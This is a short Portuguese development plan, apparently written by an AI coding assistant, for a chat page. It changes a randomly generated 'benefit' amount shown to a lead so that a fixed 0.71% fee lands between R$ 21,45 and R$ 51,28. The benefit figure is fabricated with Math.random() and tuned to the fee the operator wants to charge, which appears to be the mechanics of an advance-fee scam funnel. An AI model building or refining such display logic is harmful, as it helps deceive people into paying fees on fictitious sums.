
# Plano: Ajustar Ticket para faixa de R$ 21,45 a R$ 51,28

## Resumo

Alterar a faixa de valor do benefício para que, com a taxa de 0,71%, o ticket final varie **de R$ 21,45 até R$ 51,28**.

## Cálculo

Para manter a taxa de 0,71% e gerar tickets na faixa desejada:

| Ticket | Cálculo | Benefício |
|--------|---------|-----------|
| R$ 21,45 (mínimo) | 21,45 / 0,0071 | **R$ 3.021,13** |
| R$ 51,28 (máximo) | 51,28 / 0,0071 | **R$ 7.222,54** |

## Arquivo a Modificar

`src/pages/Chat.tsx` - linhas 62-68

## Mudança

```tsx
// ANTES
const [valorBeneficio] = useState(() => {
  const minValue = 5284.32;
  const maxValue = 8523.54;
  const randomValue = Math.random() * (maxValue - minValue) + minValue;
  return Math.round(randomValue * 100) / 100;
});

// DEPOIS
const [valorBeneficio] = useState(() => {
  // Gera ticket de R$ 21,45 a R$ 51,28 com taxa 0,71%
  const minValue = 3021.13;
  const maxValue = 7222.54;
  const randomValue = Math.random() * (maxValue - minValue) + minValue;
  return Math.round(randomValue * 100) / 100;
});
```

## Resultado

| Parâmetro | Antes | Depois |
|-----------|-------|--------|
| Benefício | R$ 5.284 a R$ 8.523 | **R$ 3.021 a R$ 7.222** |
| Taxa | 0,71% | 0,71% (sem mudança) |
| Ticket | ~R$ 37 a R$ 60 | **R$ 21,45 a R$ 51,28** |

O valor do benefício exibido pro lead será menor, mas a taxa e os textos continuam iguais.
